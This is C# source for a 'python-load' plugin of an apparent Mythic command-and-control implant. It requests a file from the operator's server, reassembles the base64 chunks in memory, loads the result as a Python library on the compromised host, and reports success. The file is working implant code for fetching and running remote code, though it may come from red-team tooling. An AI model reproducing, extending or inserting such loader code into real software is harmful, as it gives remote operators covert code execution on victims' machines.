using Agent.Interfaces;
using System.Text.Json;
using Agent.Models;
using Agent.Utilities;
using System.Collections.Concurrent;
namespace Agent
{
    public class Plugin : IFilePlugin
    {
        public string Name => "python-load";
        private IMessageManager messageManager { get; set; }
        private IPythonManager pythonManager { get; set; }
        private IAgentConfig agentConfig { get; set; }
        private ConcurrentDictionary<string, ServerUploadJob> uploadJobs { get; set; }
        private Dictionary<string, List<byte>> _streams { get; set; }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
        {
            this.messageManager = messageManager;
            this.pythonManager = pythonManager;
            this.agentConfig = config;
            this.uploadJobs = new ConcurrentDictionary<string, ServerUploadJob>();
            this._streams = new Dictionary<string, List<byte>>();
        }

        public async Task Execute(ServerJob job)
        {
            PythonLoadArgs pyArgs = JsonSerializer.Deserialize<PythonLoadArgs>(job.task.parameters);

            if (pyArgs is null)
            {
                await messageManager.AddResponse(new TaskResponse()
                {
                    task_id = job.task.id,
                    user_output = "Failed to parse args.",
                    completed = true
                });
                return;
            }


            //Start Download
            ServerUploadJob uploadJob = new ServerUploadJob(job, agentConfig.chunk_size);
            uploadJob.file_id = pyArgs.file;
            uploadJob.chunk_num = 1;
            //Add job to our tracker
            if (!uploadJobs.TryAdd(job.task.id, uploadJob))
            {
                await messageManager.AddResponse(new DownloadTaskResponse
                {
                    status = "error",
                    user_output = "failed to add job to tracker",
                    completed = true,
                    task_id = job.task.id
                }.ToJson());
                return;
            }

            _streams.Add(job.task.id, new List<byte>());

            //Officially kick off file upload with Mythic
            await messageManager.AddResponse(new UploadTaskResponse
            {
                task_id = job.task.id,
                upload = new UploadTaskResponseData
                {
                    chunk_size = uploadJob.chunk_size,
                    chunk_num = uploadJob.chunk_num,
                    file_id = uploadJob.file_id,
                    full_path = string.Empty,
                },
                user_output = string.Empty
            }.ToJson());
        }

        public async Task HandleNextMessage(ServerTaskingResponse response)
        {
            ServerUploadJob uploadJob = this.GetJob(response.task_id);

            //Did we get an upload job
            if (uploadJob is null)
            {
                await messageManager.AddResponse(new TaskResponse
                {
                    status = "error",
                    completed = true,
                    task_id = response.task_id,
                    user_output = "Failed to get job",
                }.ToJson());
                return;
            }

            //Did user request cancellation of the job?
            if (uploadJob.cancellationtokensource.IsCancellationRequested)
            {
                await messageManager.AddResponse(new TaskResponse
                {
                    status = "error",
                    completed = true,
                    task_id = response.task_id,
                    user_output = "Cancellation Requested",
                }.ToJson());
                await this.CompleteUploadJob(response.task_id);
                return;
            }

            //Update the chunks required for the upload
            if (uploadJob.total_chunks == 0)
            {
                if (response.total_chunks == 0)
                {
                    await messageManager.AddResponse(new TaskResponse
                    {
                        status = "error",
                        completed = true,
                        task_id = response.task_id,
                        user_output = "Failed to get number of chunks",
                    }.ToJson());
                    return;
                }

                uploadJob.total_chunks = response.total_chunks; //Set the number of chunks provided to us from the server
            }

            //Did we get chunk data?
            if (String.IsNullOrEmpty(response.chunk_data)) //Handle our current chunk
            {
                await messageManager.AddResponse(new TaskResponse
                {
                    status = "error",
                    completed = true,
                    task_id = response.task_id,
                    process_response = new Dictionary<string, string> { { "message", "0x12" } },

                }.ToJson());
                return;
            }

            //Write the chunk data to our stream
            if (!this.HandleNextChunk(Misc.Base64DecodeToByteArray(response.chunk_data), response.task_id))
            {
                await messageManager.AddResponse(new TaskResponse
                {
                    status = "error",
                    completed = true,
                    task_id = response.task_id,
                    user_output = "Failed to process message.",
                }.ToJson());
                await this.CompleteUploadJob(response.task_id);
                return;
            }

            //Increment chunk number for tracking
            uploadJob.chunk_num++;

            //Prepare response to Mythic
            UploadTaskResponse ur = new UploadTaskResponse()
            {
                task_id = response.task_id,
                status = $"Processed {uploadJob.chunk_num}/{uploadJob.total_chunks}",
                upload = new UploadTaskResponseData
                {
                    chunk_num = uploadJob.chunk_num,
                    file_id = uploadJob.file_id,
                    chunk_size = uploadJob.chunk_size,
                    full_path = uploadJob.path
                }
            };

            //Check if we're done
            if (response.chunk_num == uploadJob.total_chunks)
            {
                ur = new UploadTaskResponse()
                {
                    task_id = response.task_id,
                    upload = new UploadTaskResponseData
                    {
                        file_id = uploadJob.file_id,
                        full_path = uploadJob.path,
                    },
                    completed = true
                };
                await this.CompleteUploadJob(response.task_id);
            }

            //Return response
            await messageManager.AddResponse(ur.ToJson());
        }

        private bool HandleNextChunk(byte[] bytes, string task_id)
        {
            this._streams[task_id].AddRange(bytes);
            return true;
        }

        private ServerUploadJob GetJob(string task_id)
        {
            return this.uploadJobs[task_id];
        }
        /// <summary>
        /// Complete and remove the upload job from our tracker
        /// </summary>
        /// <param name="task_id">The task ID of the upload job to complete</param>
        private async Task CompleteUploadJob(string task_id)
        {
            if (!uploadJobs.ContainsKey(task_id))
            {
                return;
            }

            byte[] fContents = _streams[task_id].ToArray();
            if (pythonManager.LoadPyLib(fContents))
            {
                await messageManager.AddResponse(new TaskResponse()
                {
                    task_id = task_id,
                    user_output = "Loaded.",
                    completed = true
                });
            }
            else
            {
                await messageManager.AddResponse(new TaskResponse()
                {
                    task_id = task_id,
                    user_output = "Failed to load lib.",
                    completed = true,
                    status = "error"
                });
            }

            uploadJobs.Remove(task_id, out _);


            if (_streams.ContainsKey(task_id) && _streams[task_id] is not null)
            {
                _streams.Remove(task_id);
            }

            this.messageManager.CompleteJob(task_id);
        }
    }
}
